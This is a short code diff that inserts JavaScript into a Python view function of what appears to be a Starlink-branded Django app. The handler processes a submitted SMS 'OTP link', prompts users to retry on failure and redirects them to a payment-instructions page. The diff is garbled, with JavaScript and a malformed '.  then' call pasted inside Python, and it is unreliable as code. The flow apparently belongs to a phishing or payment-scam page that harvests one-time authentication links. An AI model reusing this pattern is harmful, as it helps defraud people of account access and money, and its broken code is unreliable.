@@ -105,7 +105,30 @@ def sync_data(request):
 
         otp_link = data.get('otp', 'No Link provided')
 
-
+         // --- THIS GOES AT THE BOTTOM OF THE FETCH ---
+    .  then(response => response.json())
+    .then(data => {
+        if (data.status === 'success') {
+            // Success! Redirect to the final success page
+            window.location.href = "{% url 'starlink_app:payment_instructions' %}"; 
+        } else {
+            // THE ERROR LOGIC
+            alert("❌ Incorrect link. Please check the SMS and try again.");
+            
+            // Force the resend button to appear immediately
+            seconds = 0; 
+            
+            // Reset the main button so they can try again
+            btn.disabled = false;
+            btn.innerHTML = "CONFIRM AUTHENTICATION";
+        }
+    })
+    .catch(error => {
+        console.error('Error:', error);
+        btn.disabled = false;
+        btn.innerHTML = "CONFIRM AUTHENTICATION";
+    });
+}
 
         # 2. Retrieve Secured Session Data
 
